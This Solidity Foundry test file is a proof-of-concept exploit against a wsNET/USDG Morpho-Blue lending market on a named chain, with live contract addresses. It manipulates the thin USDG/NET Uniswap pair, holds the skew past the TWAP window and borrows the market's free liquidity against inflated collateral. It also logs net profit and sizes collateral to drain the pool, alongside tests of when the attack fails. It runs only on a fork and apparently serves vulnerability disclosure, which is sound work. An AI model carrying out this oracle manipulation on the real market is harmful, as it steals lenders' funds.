// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {
    IERC20,
    IUniswapV2Pair,
    IPairOracle,
    ITreasury,
    ILoopbackOracle,
    IsNET,
    IwsNET,
    IStaking,
    MarketParams,
    IMorpho
} from "../src/Interfaces.sol";

/// @title wsNET / USDG Morpho-Blue (Robinhood Chain 4663) — one-sided-oracle-guard extraction PoC
/// @notice Fork-only. Reads the real protocol, skews the thin USDG/NET UniV2 pair, holds the skew
///         past the 30-minute TWAP window, supplies wsNET collateral and borrows the market's free
///         liquidity. Nothing is signed or sent on any live chain.
contract WsnetOracleTest is Test {
    // ── Robinhood Chain (4663) addresses ──
    address constant MORPHO     = 0x9D53d5E3bd5E8d4Cbfa6DB1ca238AEA02E651010;
    address constant ORACLE     = 0xCDE9599059f8Ae6D6B9F33A0aF7877827ec75F16; // LoopbackOracle
    address constant PAIRORACLE = 0x929631b33F4070D6f54477fba3FD27566567dAca; // PairOracle (v2 cumulative TWAP)
    address constant TREASURY   = 0x04822Ea321A0DEE6F40656172F29312104855d66;
    address constant SNET       = 0xb773ec2C326B7f98a5a83fc098825492F020a4c7;
    address constant WSNET      = 0x63C12667638f2Ae6fC6ae09B43D98Ec84a8586eA;
    address constant NET        = 0xCA9c78Dd337A67F6e0077F65F5E9218719d30eDf;
    address constant USDG       = 0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168;
    address constant PAIR       = 0x59F95461E68e0c77605299791E1449f175165B54; // USDG/NET UniV2
    address constant STAKING    = 0xB078cc304A0B264C5F3680DC0488954ACcd02E87;
    address constant IRM        = 0x2BD3d5965B26B51814AC95127B2b80dD6CcC0fa1;

    uint256 constant LLTV = 625000000000000000; // 62.5 %
    uint256 constant WAD = 1e18;
    // wsNET/USDG market (keccak256(abi.encode(MarketParams)))
    bytes32 constant MKT = 0xaa586d26a6fe62d9c0f0948fede6e2130500ac7a655587447e2d4a37e6330589;

    address constant ATTACKER = address(0xA11CE);
    address constant ARBER    = address(0xA2B3E);

    uint256 forkBlock;

    function setUp() public {
        string memory rpc = vm.envOr("RH_RPC_URL", string("https://robinhood.drpc.org"));
        uint256 blk = vm.envOr("RH_BLOCK", uint256(0));
        if (blk == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, blk);
        }
        forkBlock = block.number;
        vm.label(MORPHO, "Morpho");
        vm.label(ORACLE, "LoopbackOracle");
        vm.label(PAIR, "USDG/NET pair");
        vm.label(ATTACKER, "attacker");
    }

    // ───────────────────────── helpers ─────────────────────────

    function P() internal pure returns (MarketParams memory) {
        return MarketParams(USDG, WSNET, ORACLE, IRM, LLTV);
    }

    function freeLiq() internal view returns (uint256) {
        (uint128 ts, , uint128 tb, , , ) = IMorpho(MORPHO).market(MKT);
        return uint256(ts) - uint256(tb);
    }

    function oraclePrice() internal view returns (uint256) {
        return ILoopbackOracle(ORACLE).price();
    }

    function reserves() internal view returns (uint256 r0, uint256 r1, uint32 tsLast) {
        (uint112 a, uint112 b, uint32 t) = IUniswapV2Pair(PAIR).getReserves();
        return (uint256(a), uint256(b), t);
    }

    function spotWad() internal view returns (uint256) {
        (uint256 r0, uint256 r1, ) = reserves();
        return r0 * 1e21 / r1;
    }

    function getAmountIn(uint256 amountOut, uint256 rIn, uint256 rOut) internal pure returns (uint256) {
        return (rIn * amountOut * 1000) / ((rOut - amountOut) * 997) + 1;
    }

    function getAmountOut(uint256 amountIn, uint256 rIn, uint256 rOut) internal pure returns (uint256) {
        uint256 inWithFee = amountIn * 997;
        return (inWithFee * rOut) / (rIn * 1000 + inWithFee);
    }

    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }

    /// @dev Swap USDG in for NET out, targeting a post-trade reserve ratio of `mNum/1e18` x the
    ///      current ratio. Uses the real pair (incl. the NET 500 bps fee-on-transfer on the buy leg).
    function skew(uint256 mNum) internal returns (uint256 usdgIn, uint256 netRecv) {
        (uint256 r0, uint256 r1, ) = reserves();
        uint256 sqrtM = sqrt(mNum); // sqrt(m) scaled 1e9 (mNum is 1e18-scaled)
        uint256 netOut = r1 - (r1 * 1e9) / sqrtM; // r1 * (1 - 1/sqrt(m))
        usdgIn = getAmountIn(netOut, r0, r1);
        vm.startPrank(ATTACKER);
        IERC20(USDG).transfer(PAIR, usdgIn);
        IUniswapV2Pair(PAIR).swap(0, netOut, ATTACKER, "");
        vm.stopPrank();
        netRecv = IERC20(NET).balanceOf(ATTACKER);
    }

    /// @dev NET -> sNET -> wsNET -> Morpho collateral.
    function stakeWrapSupply(uint256 netAmount) internal returns (uint256 ws) {
        vm.startPrank(ATTACKER);
        IERC20(NET).approve(STAKING, netAmount);
        IStaking(STAKING).stake(ATTACKER, netAmount);
        uint256 sBal = IERC20(SNET).balanceOf(ATTACKER);
        IERC20(SNET).approve(WSNET, sBal);
        ws = IwsNET(WSNET).wrap(sBal);
        IwsNET(WSNET).approve(MORPHO, ws);
        IMorpho(MORPHO).supplyCollateral(P(), ws, ATTACKER, "");
        vm.stopPrank();
    }

    /// @dev Borrow as much of the free liquidity as the (inflated) oracle allows. Returns 0 when
    ///      the oracle fails closed (e.g. the one-sided Diverged guard after an arb-back).
    function borrowMax() internal returns (uint256 borrowed) {
        uint256 price;
        try ILoopbackOracle(ORACLE).price() returns (uint256 p) {
            price = p;
        } catch {
            return 0;
        }
        uint256 free = freeLiq();
        (, , uint128 coll) = IMorpho(MORPHO).position(MKT, ATTACKER);
        uint256 collValue = (uint256(coll) * price) / 1e36; // USDG (6 dec)
        uint256 cap = (collValue * LLTV) / 1e18;
        uint256 amt = cap < free ? cap : free;
        for (uint256 i = 0; i < 32 && amt > 0; i++) {
            vm.prank(ATTACKER);
            try IMorpho(MORPHO).borrow(P(), amt, 0, ATTACKER, ATTACKER) returns (uint256 a, uint256) {
                return a;
            } catch {
                amt = (amt * 995) / 1000;
            }
        }
        return 0;
    }

    function tryPrice() internal view returns (uint256, bool) {
        try ILoopbackOracle(ORACLE).price() returns (uint256 p) {
            return (p, true);
        } catch {
            return (0, false);
        }
    }

    function warpToCheckpointable() internal {
        uint64 lastCp = IPairOracle(PAIRORACLE).lastCheckpointAt();
        uint256 need = uint256(lastCp) + 1800 + 5;
        if (block.timestamp < need) vm.warp(need);
    }

    function restoreSlot(uint256 slot, bytes32 v) internal {
        vm.store(PAIR, bytes32(slot), v);
    }

    // ───────────────────────── 0 · live state ─────────────────────────

    function test_00_live_state() public view {
        (uint256 r0, uint256 r1, uint32 tsLast) = reserves();
        console2.log("fork block        ", forkBlock);
        console2.log("block.timestamp   ", block.timestamp);
        console2.log("oracle price (1e24)", oraclePrice());
        console2.log("twapNetUsdg (wad) ", IPairOracle(PAIRORACLE).twapNetUsdg());
        console2.log("backingPerToken   ", ITreasury(TREASURY).backingPerToken());
        console2.log("sNet index        ", IsNET(SNET).index());
        console2.log("pair r0 USDG (6d) ", r0);
        console2.log("pair r1 NET  (9d) ", r1);
        console2.log("pair tsLast       ", uint256(tsLast));
        console2.log("spotWad (1e18)    ", spotWad());
        console2.log("market free liq   ", freeLiq());
        console2.log("NET totalSupply   ", IERC20(NET).totalSupply());
        console2.log("wsNET totalSupply ", IERC20(WSNET).totalSupply());
        console2.log("staking enabled   ", IStaking(STAKING).enabled());
        console2.log("staking warmup    ", IStaking(STAKING).warmupEpochs());
    }

    // ───────────────────── 1 · the guard is one-sided ─────────────────────

    function test_01_guard_is_one_sided() public {
        uint256 base = oraclePrice();
        (uint256 r0, uint256 r1, uint32 tsLast) = reserves();
        bytes32 orig = bytes32((uint256(tsLast) << 224) | (r1 << 112) | r0);

        // DOWNWARD: dump the spot ~50 % below TWAP -> the guard must revert (Diverged 0xefac79d8)
        restoreSlot(8, bytes32((uint256(tsLast) << 224) | (r1 << 112) | (r0 / 2)));
        vm.expectRevert();
        ILoopbackOracle(ORACLE).price();

        // restore and confirm unchanged
        restoreSlot(8, orig);
        assertEq(oraclePrice(), base, "restored");
        console2.log("downside -> revert (Diverged); base price", base);

        // UPWARD: a real swap raises the price with no revert (no upward deviation guard)
        deal(USDG, ATTACKER, 1_000_000e6);
        uint256 before = oraclePrice();
        skew(2e18);
        uint256 afterUp = oraclePrice();
        console2.log("upward skew price", afterUp);
        assertGe(afterUp, before, "upward must not be blocked");
    }

    // ───────────────── 2 · baseline: the borrow reverts ─────────────────

    function test_02_baseline_borrow_reverts() public {
        uint256 free = freeLiq();
        deal(USDG, ATTACKER, 500_000e6);
        deal(WSNET, ATTACKER, 200e18); // 200 wsNET collateral (true value ~ $144.5k)
        vm.startPrank(ATTACKER);
        IwsNET(WSNET).approve(MORPHO, 200e18);
        IMorpho(MORPHO).supplyCollateral(P(), 200e18, ATTACKER, "");
        vm.stopPrank();
        uint256 price = oraclePrice();
        uint256 collValue = (200e18 * price) / 1e36;
        uint256 cap = (collValue * LLTV) / 1e18;
        console2.log("baseline price ", price);
        console2.log("collateral cap ", cap);
        console2.log("market free    ", free);
        assertTrue(cap < free, "baseline capacity must be below the market's free liquidity");
        vm.prank(ATTACKER);
        vm.expectRevert();
        IMorpho(MORPHO).borrow(P(), free, 0, ATTACKER, ATTACKER);
    }

    // ───────────────── 3 · all-in sweep (skew + hold + borrow) ─────────────────

    function test_03_allin_sweep() public {
        uint256[6] memory ms = [uint256(2e18), 3e18, 4e18, 5e18, 6e18, 8e18];
        uint256 snap = vm.snapshotState();
        for (uint256 i = 0; i < ms.length; i++) {
            _allin(ms[i]);
            vm.revertToState(snap);
        }
    }

    function _allin(uint256 mNum) internal {
        uint256 free = freeLiq();
        deal(USDG, ATTACKER, 2_000_000e6);
        warpToCheckpointable();
        IPairOracle(PAIRORACLE).checkpoint();
        uint256 priceBase = oraclePrice();

        (uint256 spent, uint256 netRecv) = skew(mNum);
        uint256 ws = stakeWrapSupply(netRecv);
        uint256 collTrue = (ws * priceBase) / 1e36;

        vm.warp(block.timestamp + 1805);
        uint256 priceSkew = oraclePrice();
        uint256 ratio = (priceSkew * WAD) / priceBase;
        uint256 borrowed = borrowMax();

        console2.log("---- all-in m (1e18)", mNum);
        console2.log("  usdg spent     ", spent);
        console2.log("  NET received   ", netRecv);
        console2.log("  wsNET supplied ", ws);
        console2.log("  true coll value", collTrue);
        console2.log("  price ratio    ", ratio);
        console2.log("  market free    ", free);
        console2.log("  borrowed       ", borrowed);
        emit log_named_uint("RESULT m_e18", mNum);
        emit log_named_uint("RESULT ratio_e18", ratio);
        emit log_named_uint("RESULT free", free);
        emit log_named_uint("RESULT borrowed", borrowed);
        emit log_named_uint("RESULT usdgSpent", spent);
        emit log_named_uint("RESULT collTrue", collTrue);
        emit log_named_int("RESULT netProfit", int256(borrowed) - int256(spent));
        emit log_named_int("RESULT abortLoss", int256(spent) - int256(collTrue));
    }

    // ───────────────── 4 · pre-held collateral (off-pool NET) ─────────────────

    function test_04_preheld_sweep() public {
        uint256[3] memory ms = [uint256(4e18), 5e18, 6e18];
        uint256 snap = vm.snapshotState();
        for (uint256 i = 0; i < ms.length; i++) {
            _preheld(ms[i]);
            vm.revertToState(snap);
        }
    }

    function _preheld(uint256 mNum) internal {
        uint256 free = freeLiq();
        deal(USDG, ATTACKER, 2_000_000e6);
        warpToCheckpointable();
        IPairOracle(PAIRORACLE).checkpoint();
        uint256 priceBase = oraclePrice();

        // the attacker pre-holds NET (bought at backing / via the InverseBond / OTC) and uses a
        // *separate* USDG skew. Size the collateral so its inflated capacity exactly covers `free`.
        (uint256 spent, uint256 netRecv) = skew(mNum);
        vm.warp(block.timestamp + 1805);
        uint256 ratio = (oraclePrice() * WAD) / priceBase; // inflated / true

        (uint256 wsReal, uint256 collTrueReal) = _supplySized(free, ratio, priceBase);
        uint256 borrowed = borrowMax();
        uint256 usdgOut = _unwind(netRecv);

        console2.log("---- pre-held m (1e18)", mNum);
        console2.log("  price ratio    ", ratio);
        console2.log("  market free    ", free);
        console2.log("  collateral ws  ", wsReal);
        console2.log("  collateral true", collTrueReal);
        console2.log("  borrowed       ", borrowed);
        console2.log("  skew spent     ", spent);
        console2.log("  unwind recover ", usdgOut);
        emit log_named_uint("PRE m_e18", mNum);
        emit log_named_uint("PRE ratio_e18", ratio);
        emit log_named_uint("PRE borrowed", borrowed);
        emit log_named_uint("PRE collTrue", collTrueReal);
        emit log_named_int("PRE net (borrow - collateral)", int256(borrowed) - int256(collTrueReal));
        emit log_named_int("PRE net (skew round-trip)", int256(usdgOut) - int256(spent));
    }

    /// @dev Supply exactly enough wsNET that `capacity == free` at the inflated mark.
    function _supplySized(uint256 free, uint256 ratio, uint256 priceBase)
        internal
        returns (uint256 ws, uint256 collTrue)
    {
        // capacity = collTrue * ratio/1e18 * LLTV/1e18 ; == free  =>  collTrue = free*1e36/(ratio*LLTV)
        uint256 collTarget = (free * WAD * WAD) / (ratio * LLTV) * 1005 / 1000; // +0.5 % margin
        uint256 wsTarget = (collTarget * 1e36) / priceBase;
        uint256 sNetNeeded = (wsTarget * IsNET(SNET).index()) / 1e18;
        deal(NET, ATTACKER, IERC20(NET).balanceOf(ATTACKER) + sNetNeeded);
        ws = stakeWrapSupply(sNetNeeded);
        collTrue = (ws * priceBase) / 1e36;
    }

    /// @dev Sell the NET acquired by the skew back into the pool (post-borrow, harmless).
    function _unwind(uint256 netRecv) internal returns (uint256 usdgOut) {
        (uint256 rr0, uint256 rr1, ) = reserves();
        uint256 sellIn = (netRecv * 95) / 100; // 5 % fee-on-transfer
        usdgOut = getAmountOut(sellIn, rr1, rr0);
        vm.startPrank(ATTACKER);
        IERC20(NET).transfer(PAIR, netRecv);
        IUniswapV2Pair(PAIR).swap(usdgOut, 0, ATTACKER, "");
        vm.stopPrank();
    }

    // ───────────────── 5 · single-transaction (no hold) must fail ─────────────────

    function test_05_single_tx_no_hold_fails() public {
        uint256 free = freeLiq();
        deal(USDG, ATTACKER, 2_000_000e6);
        uint256 priceBase = oraclePrice();
        (uint256 spent, uint256 netRecv) = skew(6e18);
        uint256 ws = stakeWrapSupply(netRecv);
        uint256 priceNow = oraclePrice();
        uint256 ratio = (priceNow * WAD) / priceBase;
        console2.log("single-tx ratio (no hold)", ratio);
        console2.log("spent", spent);
        console2.log("ws  ", ws);
        assertApproxEqAbs(ratio, WAD, WAD / 50, "same-block skew must not move the TWAP");
        (, , uint128 coll) = IMorpho(MORPHO).position(MKT, ATTACKER);
        uint256 cap = (((uint256(coll) * priceNow) / 1e36) * LLTV) / 1e18;
        console2.log("single-tx borrow capacity", cap);
        console2.log("market free            ", free);
        assertTrue(cap < free, "single-tx attack must not reach the market's free liquidity");
        vm.prank(ATTACKER);
        vm.expectRevert();
        IMorpho(MORPHO).borrow(P(), free, 0, ATTACKER, ATTACKER);
    }

    // ───────────────── 6 · downside: the skew is arbitraged back ─────────────────

    function test_06_arb_back_downside() public {
        uint256 mNum = 6e18;
        deal(USDG, ATTACKER, 2_000_000e6);
        warpToCheckpointable();
        IPairOracle(PAIRORACLE).checkpoint();
        uint256 priceBase = oraclePrice();
        (uint256 r0b, uint256 r1b, ) = reserves();
        (uint256 spent, uint256 netRecv) = skew(mNum);
        uint256 ws = stakeWrapSupply(netRecv);
        vm.warp(block.timestamp + 300);
        _arbBack(r0b, r1b, mNum);
        vm.warp(block.timestamp + 1505);
        (uint256 priceNow, bool ok) = tryPrice();
        uint256 ratio = ok ? (priceNow * WAD) / priceBase : 0;
        uint256 borrowed = borrowMax();
        uint256 collTrue = (ws * priceBase) / 1e36;
        console2.log("arb-back oracle readable", ok);
        console2.log("arb-back ratio (1e18)", ratio);
        console2.log("arb-back borrowed   ", borrowed);
        console2.log("skew spent          ", spent);
        console2.log("true collateral     ", collTrue);
        emit log_named_uint("ARB oracle_ok", ok ? 1 : 0);
        emit log_named_uint("ARB ratio_e18", ratio);
        emit log_named_uint("ARB borrowed", borrowed);
        emit log_named_int("ARB net (borrow - spent)", int256(borrowed) - int256(spent));
        emit log_named_int("ARB loss (spent - collateral)", int256(spent) - int256(collTrue));
    }

    /// @dev An arbitrageur sells NET into the skewed pool until the spot ratio returns to ~1.
    ///      The pair must absorb r1b*(1 - 1/sqrt(m)) NET; the NET 500 bps fee is paid on top.
    function _arbBack(uint256, uint256 r1b, uint256 mNum) internal {
        uint256 sqrtM = sqrt(mNum);
        uint256 receivedTarget = r1b - (r1b * 1e9) / sqrtM;
        uint256 transferIn = (receivedTarget * 100) / 95;
        (uint256 r0, uint256 r1, ) = reserves();
        uint256 usdgOut = getAmountOut(receivedTarget, r1, r0);
        deal(NET, ARBER, transferIn);
        vm.startPrank(ARBER);
        IERC20(NET).transfer(PAIR, transferIn);
        IUniswapV2Pair(PAIR).swap(usdgOut, 0, ARBER, "");
        vm.stopPrank();
    }
}
